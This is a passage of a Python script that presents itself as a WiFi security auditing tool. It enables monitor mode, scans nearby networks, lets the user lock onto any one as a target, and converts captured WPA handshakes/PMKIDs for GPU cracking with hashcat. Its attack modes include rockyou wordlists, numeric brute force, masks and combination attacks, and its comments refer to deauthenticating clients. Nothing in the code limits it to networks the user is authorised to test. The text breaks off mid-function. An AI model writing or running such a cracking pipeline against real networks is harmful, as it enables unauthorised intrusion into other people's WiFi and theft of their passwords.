#!/usr/bin/env python3
# -----------------------------------------------------------------------------
# Name:        airmon_ng_gpu.py
# Description: GPU-Accelerated WiFi Security Auditing Tool for Arch/Hyprland
# Hardware:    NVIDIA RTX 3050 Ti (4GB VRAM) + Intel AX-series Wi-Fi
# Author:      Elite DevOps
# Version:     4.0.0 (Python/Rich Edition - parity with bash 3.1.4)
# Requires:    Python 3.9+, python-rich, aircrack-ng, hcxtools, hashcat, bully
# Extends:     airmon_ng_gpu.sh v3.1.4
# -----------------------------------------------------------------------------
# PIPELINE:
#   Phase 1 - Capture:    airodump-ng    -> .cap
#   Phase 2 - Extraction: hcxpcapngtool -> .hc22000
#   Phase 3 - Compute:    hashcat -m 22000 (GPU-accelerated PBKDF2-HMAC-SHA1)
# -----------------------------------------------------------------------------

import csv
import datetime
import glob
import os
import pwd
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time

from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

# -----------------------------------------------------------------------------
# CONSTANTS
# -----------------------------------------------------------------------------
HASHCAT_MODE = 22000
GPU_TEMP_ABORT = 85
HASHCAT_WORKLOAD = 3
HASHCAT_RULES_DIR = "/usr/share/hashcat/rules"
SCAN_PREFIX = "scan_dump"
CLIENT_SCAN_PREFIX = "client_scan"

DEBUG_MODE = os.environ.get("DEBUG", "0") == "1"

console = Console(highlight=False)

# -----------------------------------------------------------------------------
# GLOBAL STATE
# -----------------------------------------------------------------------------
TMP_DIR = ""
REAL_USER = ""
REAL_HOME = ""
REAL_GROUP = ""
REAL_UID = 0

mon_iface = ""
phy_iface = ""
original_nm_state = None
handshake_dir = ""
list_dir = ""
target_bssid = ""
target_ch = 0
target_essid = ""
target_essid_safe = ""
final_wordlist = ""
connected_clients = []  # list of (mac, pwr)
cleanup_in_progress = False

hc22000_file = ""
hashcat_potfile = ""
hashcat_session_name = ""
gpu_available = 0
cuda_available = 0

recorder_proc = None
recorder_thread = None
handshake_detected = threading.Event()


# -----------------------------------------------------------------------------
# LOGGING
# -----------------------------------------------------------------------------
def log_info(msg):
    console.print(f"[blue][INFO][/blue] {msg}")


def log_success(msg):
    console.print(f"[green][OK][/green] {msg}")


def log_warn(msg):
    console.print(f"[yellow][WARN][/yellow] {msg}")


def log_err(msg):
    console.print(f"[red][ERR][/red] {msg}")


def log_debug(msg):
    if DEBUG_MODE:
        console.print(f"[cyan][DEBUG][/cyan] {msg}")


def log_gpu(msg):
    console.print(f"[magenta][GPU][/magenta] {msg}")


def die(msg, code=1):
    log_err(msg)
    sys.exit(code)


# -----------------------------------------------------------------------------
# AUTO-ELEVATION
# -----------------------------------------------------------------------------
def elevate():
    global REAL_USER, REAL_HOME, REAL_GROUP, REAL_UID
    if os.geteuid() == 0:
        sudo_user = os.environ.get("SUDO_USER", "")
        if sudo_user:
            REAL_USER = sudo_user
            try:
                REAL_HOME = pwd.getpwnam(sudo_user).pw_dir
            except KeyError:
                REAL_HOME = f"/home/{sudo_user}"
        else:
            REAL_USER = os.environ.get("USER", "root")
            REAL_HOME = os.environ.get("HOME", "/root")
        REAL_GROUP = subprocess.run(
            ["id", "-gn", REAL_USER], capture_output=True, text=True
        ).stdout.strip()
        REAL_UID = int(subprocess.run(
            ["id", "-u", REAL_USER], capture_output=True, text=True
        ).stdout.strip())
        return

    log_info("Elevating permissions to root (required for hardware access)...")
    script = os.path.abspath(sys.argv[0])
    os.execvp(
        "sudo",
        [
            "sudo",
            "--preserve-env=TERM,WAYLAND_DISPLAY,XDG_RUNTIME_DIR,DISPLAY",
            sys.executable,
            script,
            *sys.argv[1:],
        ],
    )


def make_tmp_dir():
    global TMP_DIR
    TMP_DIR = tempfile.mkdtemp(prefix="wifi_audit_gpu_")
    if not TMP_DIR or not os.path.isdir(TMP_DIR) or not os.access(TMP_DIR, os.W_OK):
        sys.exit("Error: Temporary directory is not accessible\n")


# -----------------------------------------------------------------------------
# RUN AS USER / CLIPBOARD
# -----------------------------------------------------------------------------
def run_as_user(cmd, stdin_data=None):
    xdg = os.environ.get("XDG_RUNTIME_DIR", f"/run/user/{REAL_UID}")
    env_list = [f"XDG_RUNTIME_DIR={xdg}"]

    wd = os.environ.get("WAYLAND_DISPLAY", "")
    if not wd:
        try:
            sockets = sorted(glob.glob(f"{xdg}/wayland-*"))
        except Exception:
            sockets = []
        if sockets:
            wd = sockets[0].rsplit("/", 1)[1]
    if wd:
        env_list.append(f"WAYLAND_DISPLAY={wd}")
    if os.environ.get("DISPLAY"):
        env_list.append(f"DISPLAY={os.environ['DISPLAY']}")
    if os.environ.get("DBUS_SESSION_BUS_ADDRESS"):
        env_list.append(
            f"DBUS_SESSION_BUS_ADDRESS={os.environ['DBUS_SESSION_BUS_ADDRESS']}"
        )

    try:
        if stdin_data is not None:
            result = subprocess.run(
                ["sudo", "-u", REAL_USER, "env", *env_list, *cmd],
                input=stdin_data,
                capture_output=True,
            )
        else:
            result = subprocess.run(
                ["sudo", "-u", REAL_USER, "env", *env_list, *cmd],
                capture_output=True,
            )
        return result
    except Exception:
        return None


def copy_to_clipboard(text):
    if shutil.which("wl-copy"):
        result = run_as_user(["wl-copy", "--trim-newline"], stdin_data=text.encode())
        if result is not None and result.returncode == 0:
            return True
    if shutil.which("xclip"):
        result = run_as_user(["xclip", "-selection", "clipboard"], stdin_data=text.encode())
        if result is not None:
            return result.returncode == 0
    elif shutil.which("xsel"):
        result = run_as_user(["xsel", "--clipboard", "--input"], stdin_data=text.encode())
        if result is not None:
            return result.returncode == 0
    return False


# -----------------------------------------------------------------------------
# CLEANUP
# -----------------------------------------------------------------------------
def stop_recorder():
    global recorder_proc, recorder_thread, handshake_detected
    if recorder_proc and recorder_proc.poll() is None:
        recorder_proc.terminate()
        try:
            recorder_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            recorder_proc.kill()
    recorder_proc = None
    recorder_thread = None
    handshake_detected.clear()


def cleanup():
    global cleanup_in_progress
    if cleanup_in_progress:
        return
    cleanup_in_progress = True

    console.print("")
    log_info("Initiating cleanup sequence...")

    stop_recorder()

    if mon_iface:
        subprocess.run(
            ["pkill", "-TERM", "-f", f"airodump-ng.*{mon_iface}"],
            capture_output=True,
        )
        subprocess.run(
            ["pkill", "-TERM", "-f", f"aireplay-ng.*{mon_iface}"],
            capture_output=True,
        )
        subprocess.run(
            ["pkill", "-TERM", "-f", f"bully.*{mon_iface}"],
            capture_output=True,
        )
        time.sleep(0.5)
        subprocess.run(
            ["pkill", "-KILL", "-f", f"airodump-ng.*{mon_iface}"],
            capture_output=True,
        )
        subprocess.run(
            ["pkill", "-KILL", "-f", f"aireplay-ng.*{mon_iface}"],
            capture_output=True,
        )

    if subprocess.run(["pgrep", "-x", "hashcat"], capture_output=True).returncode == 0:
        log_info("Sending SIGINT to hashcat (saving session checkpoint)...")
        subprocess.run(["pkill", "-SIGINT", "-x", "hashcat"], capture_output=True)
        time.sleep(2)
        subprocess.run(["pkill", "-SIGKILL", "-x", "hashcat"], capture_output=True)

    if mon_iface and os.path.isdir(f"/sys/class/net/{mon_iface}"):
        log_info(f"Stopping monitor mode on {mon_iface}...")
        subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True)

    if original_nm_state == "active":
        if subprocess.run(
            ["systemctl", "is-active", "--quiet", "NetworkManager"]
        ).returncode != 0:
            log_info("Restarting NetworkManager...")
            if subprocess.run(["systemctl", "restart", "NetworkManager"]).returncode != 0:
                log_warn("Failed to restart NetworkManager.")
    elif original_nm_state is None:
        subprocess.run(["systemctl", "start", "NetworkManager"], capture_output=True)

    if handshake_dir and os.path.isdir(handshake_dir):
        if hc22000_file and os.path.isfile(hc22000_file):
            dest_hash = os.path.join(handshake_dir, os.path.basename(hc22000_file))
            try:
                shutil.copy2(hc22000_file, dest_hash)
                subprocess.run(
                    ["chown", f"{REAL_USER}:{REAL_GROUP}", dest_hash],
                    capture_output=True,
                )
                log_info(f"Hash file preserved: {dest_hash}")
            except Exception:
                pass
        if (hashcat_potfile and os.path.isfile(hashcat_potfile)
                and os.path.getsize(hashcat_potfile) > 0):
            dest_pot = os.path.join(handshake_dir, os.path.basename(hashcat_potfile))
            try:
                shutil.copy2(hashcat_potfile, dest_pot)
                subprocess.run(
                    ["chown", f"{REAL_USER}:{REAL_GROUP}", dest_pot],
                    capture_output=True,
                )
                log_info(f"Potfile preserved: {dest_pot}")
            except Exception:
                pass

    if TMP_DIR and os.path.isdir(TMP_DIR):
        shutil.rmtree(TMP_DIR, ignore_errors=True)

    log_success("System returned to normal state.")


# -----------------------------------------------------------------------------
# DEPENDENCY CHECK
# -----------------------------------------------------------------------------
def check_deps():
    global original_nm_state
    original_nm_state = (
        "active"
        if subprocess.run(
            ["systemctl", "is-active", "--quiet", "NetworkManager"]
        ).returncode == 0
        else "inactive"
    )

    capture_deps = {
        "aircrack-ng": "aircrack-ng",
        "bully": "bully",
        "wash": "reaver",
        "lspci": "pciutils",
        "timeout": "coreutils",
        "iw": "iw",
    }
    gpu_deps = {
        "hcxpcapngtool": "hcxtools",
        "hashcat": "hashcat",
        "nvidia-smi": "nvidia-utils",
    }

    missing = []
    for binary, pkg in capture_deps.items():
        if not shutil.which(binary):
            missing.append(pkg)
    for binary, pkg in gpu_deps.items():
        if not shutil.which(binary):
            missing.append(pkg)

    if missing:
        log_warn(f"Missing dependencies: {' '.join(missing)}")
        console.print("Options:")
        console.print("1) Install with existing package database (pacman -S)")
        console.print("2) Full system upgrade + install (pacman -Syu) [Recommended]")
        console.print("3) Exit and install manually")
        choice = input("Selection [2]: ").strip() or "2"
        if choice == "1":
            if subprocess.run(["pacman", "-S", "--noconfirm", "--needed", *missing]).returncode != 0:
                die("Failed to install dependencies.")
        elif choice == "2":
            if subprocess.run(["pacman", "-Syu", "--noconfirm", "--needed", *missing]).returncode != 0:
                die("Failed to install dependencies.")
        else:
            log_info(f"Please install: {' '.join(missing)}")
            sys.exit(0)

    if not (shutil.which("wl-copy") or shutil.which("xclip") or shutil.which("xsel")):
        log_warn("No clipboard tool found. Install 'wl-clipboard' (Wayland) or 'xclip' (X11).")

    log_success("All dependencies satisfied.")


# -----------------------------------------------------------------------------
# PATH VALIDATION
# -----------------------------------------------------------------------------
def validate_path(path):
    if not path:
        return False
    dangerous_chars = "`$();&|<>!*?[]{}\\'\""
    for char in dangerous_chars:
        if char in path:
            log_debug(f"Path contains dangerous character: {char}")
            return False
    if any(ord(c) < 32 or ord(c) == 127 for c in path):
        return False
    if path.startswith("-"):
        return False
    return True


# -----------------------------------------------------------------------------
# DIRECTORY SETUP
# -----------------------------------------------------------------------------
def setup_directories():
    global handshake_dir, list_dir

    default_project_dir = os.path.join(REAL_HOME, "Documents", "wifi_testing")
    default_handshake_dir = os.path.join(default_project_dir, "handshake")
    default_list_dir = os.path.join(default_project_dir, "list")

    console.print()
    log_info("Configuration: Handshake Storage")
    console.print(f"Default: {default_handshake_dir}")

    user_hs_path = input("Press ENTER to use default, or type a custom path: ").strip()

    if not user_hs_path:
        handshake_dir = default_handshake_dir
    elif validate_path(user_hs_path):
        handshake_dir = user_hs_path.rstrip("/")
    else:
        log_warn("Invalid characters in path. Using default.")
        handshake_dir = default_handshake_dir

    if not os.path.isdir(handshake_dir):
        result = run_as_user(["mkdir", "-p", handshake_dir])
        if result is None or result.returncode != 0:
            try:
                os.makedirs(handshake_dir, exist_ok=True)
            except Exception:
                die("Failed to create handshake directory")
    subprocess.run(
        ["chown", "-R", f"{REAL_USER}:{REAL_GROUP}", handshake_dir],
        capture_output=True,
    )
    log_success(f"Handshakes will be saved to: {handshake_dir}")

    console.print()
    log_info("Configuration: Password Wordlists")
    console.print(f"Default: {default_list_dir}")

    user_list_path = input("Press ENTER to use default, or type a custom path: ")

    if not user_list_path:
        list_dir = default_list_dir
    elif validate_path(user_list_path):
        list_dir = user_list_path.rstrip("/")
    else:
        log_warn("Invalid characters in path. Using default.")
        list_dir = default_list_dir

    if not os.path.isdir(list_dir):
        result = run_as_user(["mkdir", "-p", list_dir])
        if result is None or result.returncode != 0:
            try:
                os.makedirs(list_dir, exist_ok=True)
            except Exception:
                die("Failed to create wordlist directory")
        log_warn(f"Directory {list_dir} created (currently empty).")
    subprocess.run(
        ["chown", "-R", f"{REAL_USER}:{REAL_GROUP}", list_dir],
        capture_output=True,
    )


# -----------------------------------------------------------------------------
# INTERFACE UTILITIES
# -----------------------------------------------------------------------------
def get_interfaces_by_type(target_type):
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
    except Exception:
        return []
    interfaces = []
    current_name = ""
    for line in result.stdout.splitlines():
        stripped = line.strip()
        if stripped.startswith("Interface "):
            parts = stripped.split()
            if len(parts) >= 2:
                current_name = parts[1]
        elif stripped.startswith("type "):
            parts = stripped.split()
            if len(parts) >= 2 and parts[1] == target_type and current_name:
                interfaces.append(current_name)
            current_name = ""
    return interfaces


def select_interface():
    global phy_iface
    log_info("Scanning for wireless interfaces...")

    interfaces = get_interfaces_by_type("managed")

    if not interfaces:
        monitors = get_interfaces_by_type("monitor")
        if not monitors:
            die("No wireless interfaces found.")
        log_warn(f"No managed interfaces found. Detected active monitor: {' '.join(monitors)}")
        log_info("Attempting to reset interfaces...")
        for mon in monitors:
            subprocess.run(["airmon-ng", "stop", mon], capture_output=True)
        time.sleep(2)
        interfaces = get_interfaces_by_type("managed")
        if not interfaces:
            die("Failed to reset interfaces. Reload WiFi modules.")
        log_success("Interface reset successful.")

    if len(interfaces) == 1:
        phy_iface = interfaces[0]
        log_success(f"Auto-selected interface: {phy_iface}")
    else:
        console.print("Select interface:")
        for idx, iface in enumerate(interfaces, 1):
            console.print(f"  {idx}) {iface}")
        while True:
            try:
                sel = int(input("Enter selection: ").strip())
            except (ValueError, EOFError):
                log_warn("Invalid selection. Try again.")
                continue
            if 1 <= sel <= len(interfaces):
                phy_iface = interfaces[sel - 1]
                break
            log_warn("Invalid selection. Try again.")

    if not phy_iface:
        die("No interface selected.")


# -----------------------------------------------------------------------------
# HARDWARE DETECTION & MONITOR MODE
# -----------------------------------------------------------------------------
def detect_hardware():
    try:
        proc = subprocess.run(["lspci"], capture_output=True, text=True, timeout=10)
        if re.search(r"Network controller.*Intel", proc.stdout, re.IGNORECASE):
            log_success("Detected Intel Wi-Fi Hardware.")
            return True
    except Exception:
        pass
    log_info("Detected Generic/Other Wi-Fi Hardware.")
    return False


def enable_monitor_mode():
    global mon_iface
    log_info("Killing conflicting processes...")
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)

    log_info(f"Enabling Monitor Mode on {phy_iface}...")
    proc = subprocess.run(
        ["airmon-ng", "start", phy_iface], capture_output=True, text=True
    )
    if proc.returncode != 0:
        die(f"Failed to start monitor mode: {proc.stderr.strip() or proc.stdout.strip()}")
    time.sleep(1)

    monitors = get_interfaces_by_type("monitor")
    mon_iface = monitors[0] if monitors else ""

    if not mon_iface:
        match = re.search(r"monitor mode.*enabled on ([^\s)]+)", proc.stdout + proc.stderr)
        if match:
            mon_iface = match.group(1).strip()

    if not mon_iface:
        for candidate in (phy_iface + "mon", "wlan0mon", "wlan1mon"):
            if os.path.isdir(f"/sys/class/net/{candidate}"):
                mon_iface = candidate
                break

    if not mon_iface:
        die("Could not determine monitor interface name.")
    log_success(f"Monitor mode active on: {mon_iface}")
    subprocess.run(["ip", "link", "set", mon_iface, "up"], capture_output=True)

    if detect_hardware():
        log_info("Attempting Intel optimizations (Power Save OFF)...")
        result = subprocess.run(
            ["iw", "dev", mon_iface, "set", "power_save", "off"], capture_output=True
        )
        if result.returncode != 0:
            console.print(
                "      (Note: kernel-enforced power management active - normal for AX201)"
            )
    else:
        subprocess.run(
            ["iw", "dev", mon_iface, "set", "power_save", "off"], capture_output=True
        )


# -----------------------------------------------------------------------------
# AIRODUMP CSV PARSING
# -----------------------------------------------------------------------------
def parse_airodump_csv(csv_path):
    networks = []
    stations = []
    try:
        with open(csv_path, newline="", encoding="utf-8", errors="replace") as fh:
            reader = csv.reader(fh, skipinitialspace=True)
            in_stations = False
            for row in reader:
                if not row:
                    continue
                first = row[0].strip()
                if first.upper() == "STATION MAC":
                    in_stations = True
                    continue
                if in_stations:
                    stations.append(row)
                    continue
                if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", first):
                    networks.append(row)
    except OSError:
        pass
    return networks, stations


# -----------------------------------------------------------------------------
# NETWORK SCANNING
# -----------------------------------------------------------------------------
def scan_targets():
    global target_bssid, target_ch, target_essid, target_essid_safe

    for f in glob.glob(os.path.join(TMP_DIR, f"{SCAN_PREFIX}*")):
        os.remove(f)

    log_info("Starting network scan (2.4 GHz & 5 GHz)...")
    log_info("Scanning for 10 seconds. Please wait...")

    scan_duration = 10
    with open(os.devnull, "wb") as devnull:
        scan_proc = subprocess.Popen(
            [
                "timeout", "--signal=SIGTERM", f"{scan_duration + 10}s",
                "airodump-ng", "--band", "abg",
                "-w", os.path.join(TMP_DIR, SCAN_PREFIX),
                "--output-format", "csv",
                "--write-interval", "1",
                "--", mon_iface,
            ],
            stdout=devnull,
            stderr=devnull,
        )
        for i in range(scan_duration, 0, -1):
            console.print(f"\rScanning... {i:2d} ", end="", highlight=False, soft_wrap=True)
            time.sleep(1)
        console.print("\rScanning... Done.  ", highlight=False, soft_wrap=True)
        scan_proc.terminate()
        try:
            scan_proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            scan_proc.kill()

    time.sleep(1)
    csv_file = os.path.join(TMP_DIR, f"{SCAN_PREFIX}-01.csv")
    if not os.path.isfile(csv_file):
        die("Scan failed to generate output.")

    log_info("Parsing targets...")
    console.print()

    networks, _ = parse_airodump_csv(csv_file)

    entries = []
    for row in networks:
        bssid = row[0].strip()
        pwr = row[8].strip()
        priv = row[5].strip()
        essid = row[13].strip()
        try:
            ch = int(row[3].strip())
        except (ValueError, TypeError):
            ch = 0

        if ch < 1 or ch > 196:
            band = "N/A"
            ch = 0
        elif 1 <= ch <= 14:
            band = "2.4G"
        elif ch >= 32:
            band = "5G"
        else:
            band = "N/A"
            ch = 0

        if not essid:
            continue
        entries.append([bssid, pwr, ch, band, priv, essid])

    if not entries:
        die("No networks found. Try scanning again.")

    table = Table(title="Available Networks", box=box.ROUNDED)
    table.add_column("ID", justify="right")
    table.add_column("BSSID")
    table.add_column("PWR", justify="right")
    table.add_column("CH", justify="right")
    table.add_column("BAND")
    table.add_column("SEC")
    table.add_column("ESSID")
    for idx, entry in enumerate(entries, 1):
        table.add_row(str(idx), entry[0], str(entry[1]), str(entry[2]),
                      entry[3], entry[4], entry[5])
    console.print(table)
    console.print()

    while True:
        try:
            selection = int(input("Select Target ID: ").strip())
        except (ValueError, EOFError):
            log_warn("Invalid selection.")
            continue
        if 1 <= selection <= len(entries):
            break
        log_warn(f"Invalid selection. Enter a number between 1 and {len(entries)}.")

    target_bssid = entries[selection - 1][0]
    target_ch = entries[selection - 1][2]
    target_essid = entries[selection - 1][5]

    tmp_safe = re.sub(r"[^a-zA-Z0-9_-]", "_", target_essid)
    tmp_safe = re.sub(r"_+", "_", tmp_safe).strip("_")
    target_essid_safe = tmp_safe or "network"

    log_success(f"Target Locked: {target_essid} ({target_bssid}) on CH {target_ch}")


# -----------------------------------------------------------------------------
# ROCKYOU / WORDLIST
# -----------------------------------------------------------------------------
def find_rockyou():
    paths = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.gz",
        os.path.join(REAL_HOME, "wordlists", "rockyou.txt"),
        os.path.join(REAL_HOME, ".wordlists", "rockyou.txt"),
        "/opt/wordlists/rockyou.txt",
        "/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt",
    ]
    for p in paths:
        if os.path.isfile(p) and os.access(p, os.R_OK):
            return p
    return None


def prepare_wordlist(attack_type):
    global final_wordlist

    log_info(f"Preparing wordlists from: {list_dir}")
    try:
        files = sorted(
            f for f in os.listdir(list_dir)
            if os.path.isfile(os.path.join(list_dir, f))
        )
    except OSError:
        files = []

    if files:
        if attack_type == "D":
            log_warn("Combination attack (-a 1) requires one explicit primary wordlist file.")
            if len(files) == 1:
                final_wordlist = os.path.join(list_dir, files[0])
                log_success(f"Auto-selected primary wordlist: {files[0]}")
            else:
                log_info("Multiple files found. Select the PRIMARY wordlist:")
                for i, f in enumerate(files, 1):
                    console.print(f"  {i}) {f}")
                while True:
                    try:
                        choice = int(input(f"Select primary wordlist [1-{len(files)}]: ").strip())
                    except (ValueError, EOFError):
                        log_warn("Invalid selection.")
                        continue
                    if 1 <= choice <= len(files):
                        final_wordlist = os.path.join(list_dir, files[choice - 1])
                        log_success(f"Selected primary wordlist: {files[choice - 1]}")
                        break
                    log_warn("Invalid selection.")
        else:
            log_success(f"Found {len(files)} list(s). Passing directory to hashcat natively.")
            final_wordlist = list_dir
        return

    log_warn(f"No files found in {list_dir}.")
    rockyou_path = find_rockyou()
    if rockyou_path:
        console.print("Options:")
        console.print(f"1) Use detected RockYou ({rockyou_path})")
        console.print("2) Enter custom path manually")
        wl_select = input("Selection [1/2] (Default 1): ").strip() or "1"
        if wl_select == "2":
            custom_wl = input("Enter full path to wordlist: ").strip()
            if os.path.isfile(custom_wl) and os.access(custom_wl, os.R_OK):
                final_wordlist = custom_wl
            else:
                log_err("File not found or not readable.")
                final_wordlist = ""
        else:
            if rockyou_path.endswith(".gz"):
                log_info("Decompressing rockyou.txt.gz...")
                dest = os.path.join(TMP_DIR, "rockyou.txt")
                try:
                    with open(dest, "wb") as out:
                        subprocess.run(["zcat", rockyou_path], stdout=out, check=True)
                    final_wordlist = dest
                except Exception:
                    log_warn("Failed to decompress rockyou.txt.gz")
                    final_wordlist = ""
            else:
                final_wordlist = rockyou_path
    else:
        log_warn("RockYou wordlist not found in common locations.")
        log_info("Install with: sudo pacman -S seclists")
        custom_wl = input("Enter full path to wordlist (or ENTER to skip): ").strip()
        if os.path.isfile(custom_wl) and os.access(custom_wl, os.R_OK):
            final_wordlist = custom_wl
        else:
            log_warn("No wordlist provided. Dictionary/Combination attacks unavailable.")
            final_wordlist = ""


# -----------------------------------------------------------------------------
# CLIENT SCANNING
# -----------------------------------------------------------------------------
def get_connected_clients(custom_csv=""):
    global connected_clients

    specific_csv = os.path.join(TMP_DIR, f"{CLIENT_SCAN_PREFIX}-01.csv")
    initial_csv = os.path.join(TMP_DIR, f"{SCAN_PREFIX}-01.csv")
    source_csv = ""

    if custom_csv:
        attempts = 0
        while not os.path.isfile(custom_csv) and attempts < 5:
            time.sleep(1)
            attempts += 1
        if os.path.isfile(custom_csv):
            source_csv = custom_csv

    if not source_csv:
        if os.path.isfile(specific_csv):
            source_csv = specific_csv
        elif os.path.isfile(initial_csv):
            source_csv = initial_csv
        else:
            connected_clients = []
            return

    clients = []
    now = time.time()
    _, stations = parse_airodump_csv(source_csv)
    for row in stations:
        if len(row) < 6:
            continue
        mac = row[0].strip()
        last_seen = row[2].strip()
        pwr = row[3].strip()
        bssid = row[5].strip()
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac):
            continue
        if bssid.upper() != target_bssid.upper():
            continue
        try:
            last_seen_ts = datetime.datetime.strptime(
                last_seen, "%Y-%m-%d %H:%M:%S"
            ).timestamp()
        except ValueError:
            continue
        if last_seen_ts > 0 and (now - last_seen_ts) > 60:
            continue
        clients.append([mac, pwr])

    connected_clients = clients


# -----------------------------------------------------------------------------
# GPU HARDWARE PROBE
# -----------------------------------------------------------------------------
def nvidia_query(query):
    try:
        proc = subprocess.run(
            ["nvidia-smi", f"--query-gpu={query}", "--format=csv,noheader,nounits"],
            capture_output=True, text=True, timeout=10,
        )
        lines = [l for l in proc.stdout.splitlines() if l.strip()]
        return lines[0].strip() if lines else ""
    except Exception:
        return ""


def probe_gpu():
    global gpu_available, cuda_available

    log_gpu("Probing GPU hardware...")

    if not shutil.which("nvidia-smi"):
        log_warn("nvidia-smi not found - NVIDIA driver may not be loaded.")
        log_warn("GPU cracking unavailable; hashcat will fall back to CPU/OpenCL mode.")
        gpu_available = 0
        return

    gpu_available = 1

    gpu_name = nvidia_query("name") or "Unknown"
    gpu_temp = nvidia_query("temperature.gpu")
    vram_total = nvidia_query("memory.total") or "?"
    vram_free = nvidia_query("memory.free") or "?"

    log_gpu(f"Device : {gpu_name}")
    log_gpu(f"VRAM   : {vram_free} MiB free / {vram_total} MiB total")
    log_gpu(f"Temp   : {gpu_temp or 'unknown'}C  (abort at {GPU_TEMP_ABORT}C)")

    if gpu_temp and gpu_temp.isdigit():
        gpu_temp_int = int(gpu_temp)
        if gpu_temp_int >= GPU_TEMP_ABORT:
            die(f"GPU already at {gpu_temp}C - at or above abort threshold ({GPU_TEMP_ABORT}C). Allow it to cool first.")
        elif gpu_temp_int >= 75:
            log_warn(f"GPU pre-session temp is elevated ({gpu_temp}C). Ensure ventilation is clear.")

    hashcat_info = ""
    try:
        proc = subprocess.run(
            ["timeout", "15s", "hashcat", "-I"],
            capture_output=True, text=True, timeout=20,
        )
        hashcat_info = proc.stdout + proc.stderr
    except Exception:
        pass

    if re.search(r"Falling back to OpenCL runtime", hashcat_info, re.IGNORECASE):
        cuda_available = 0
        log_gpu("[yellow]CUDA backend  : UNUSABLE (SDK/RTC missing) - falling back to OpenCL[/yellow]")
    elif re.search(r"CUDA Info|CUDA Platform", hashcat_info):
        cuda_available = 1
        log_gpu("[green]CUDA backend  : CONFIRMED[/green]")
    elif re.search(r"opencl", hashcat_info, re.IGNORECASE):
        cuda_available = 0
        log_gpu("[yellow]OpenCL backend: AVAILABLE (CUDA not found)[/yellow]")
    else:
        log_warn("No GPU compute backend detected by hashcat. Will use CPU.")
        gpu_available = 0
        cuda_available = 0

    log_success("GPU probe complete.")


# -----------------------------------------------------------------------------
# GPU THERMAL WATCHDOG
# -----------------------------------------------------------------------------
def gpu_thermal_watchdog(sentinel_file, stop_event):
    if not gpu_available:
        return
    while not stop_event.is_set():
        time.sleep(5)
        if os.path.isfile(sentinel_file):
            return
        temp = ""
        try:
            proc = subprocess.run(
                ["timeout", "2s", "nvidia-smi", "--query-gpu=temperature.gpu",
                 "--format=csv,noheader,nounits"],
                capture_output=True, text=True, timeout=5,
            )
            lines = [l for l in proc.stdout.splitlines() if l.strip()]
            temp = lines[0].strip() if lines else ""
        except Exception:
            temp = ""
        if not temp or not temp.isdigit():
            continue
        if int(temp) >= GPU_TEMP_ABORT:
            with open(sentinel_file, "w") as fh:
                fh.write(temp)
            console.print(f"\n[magenta][GPU][/magenta] THERMAL ABORT: {temp}C - stopping hashcat.")
            subprocess.run(["pkill", "-SIGINT", "-x", "hashcat"], capture_output=True)
            time.sleep(3)
            subprocess.run(["pkill", "-SIGKILL", "-x", "hashcat"], capture_output=True)
            return
        console.print(f"[magenta][GPU][/magenta] Thermal: {temp}C / {GPU_TEMP_ABORT}C")


# -----------------------------------------------------------------------------
# PHASE 2 - HASH EXTRACTION
# -----------------------------------------------------------------------------
def convert_cap_to_hc22000(cap_file):
    global hc22000_file

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    hc22000_file = os.path.join(TMP_DIR, f"{target_essid_safe}_{timestamp}.hc22000")

    log_gpu("Phase 2: Hash Extraction")
    log_gpu(f"Input  : {cap_file}")
    log_gpu(f"Output : {hc22000_file}")
    log_info("Parsing 802.11 frames - extracting PMKID/EAPOL, stripping noise...")

    proc = subprocess.run(
        ["hcxpcapngtool", "-o", hc22000_file, cap_file],
        capture_output=True, text=True,
    )
    hcx_output = proc.stdout + proc.stderr

    log_debug(f"hcxpcapngtool exit: {proc.returncode}")
    log_debug(f"hcxpcapngtool output: {hcx_output}")

    if not os.path.isfile(hc22000_file) or os.path.getsize(hc22000_file) == 0:
        log_err("Hash extraction produced no output. Possible causes:")
        log_warn("  1. Client did not re-associate after deauth")
        log_warn("  2. Only a partial handshake was captured")
        log_warn("  3. Capture file is truncated or corrupt")
        log_info("hcxpcapngtool said:")
        for line in hcx_output.splitlines()[:20]:
            console.print(line)
        hc22000_file = ""
        return 1

    try:
        with open(hc22000_file, "rb") as fh:
            hash_count = sum(1 for _ in fh)
    except OSError:
        hash_count = 0
    subprocess.run(["chown", f"{REAL_USER}:{REAL_GROUP}", hc22000_file], capture_output=True)
    log_success(f"Extracted {hash_count} hash record(s) -> {os.path.basename(hc22000_file)}")

    for line in hcx_output.splitlines():
        if re.match(r"^(PMKID|EAPOL|networks|summary|total)", line):
            log_gpu(line)

    return 0


# -----------------------------------------------------------------------------
# ATTACK VECTOR SELECTION
# -----------------------------------------------------------------------------
def select_attack_vector():
    console.print()
    console.print(Panel(
        "A) Rule-Based Dictionary Attack\n"
        "   (-a 0 + wordlist + best64.rule)\n"
        "   Best for: common passwords and their variations\n\n"
        "B) 8-Digit Numeric Brute Force\n"
        "   (-a 3  ?d?d?d?d?d?d?d?d)\n"
        "   Best for: ISP default PINs, phone numbers\n\n"
        "C) Custom Mask Brute Force\n"
        "   (-a 3, user-defined mask)\n"
        "   Best for: known password structure\n\n"
        "D) Combination Attack\n"
        "   (-a 1, two wordlists concatenated)\n"
        "   Best for: compound passphrases (word-to-word patterns)\n\n"
        "E) Smart Sequential Brute Force (8-12 chars)\n"
        "   (Numbers first, then Lowercase+Num, Alphanumeric, then All/Special)\n"
        "   Uses dynamic .hcmask files for intelligent staging.",
        title="[bold cyan]GPU Attack Vector Selection[/bold cyan]",
        border_style="cyan",
        box=box.ROUNDED,
    ))
    console.print()

    while True:
        vector = input("Select attack vector [A/B/C/D/E] (Default: A): ").strip().upper() or "A"
        if vector in ("A", "B", "C", "D", "E"):
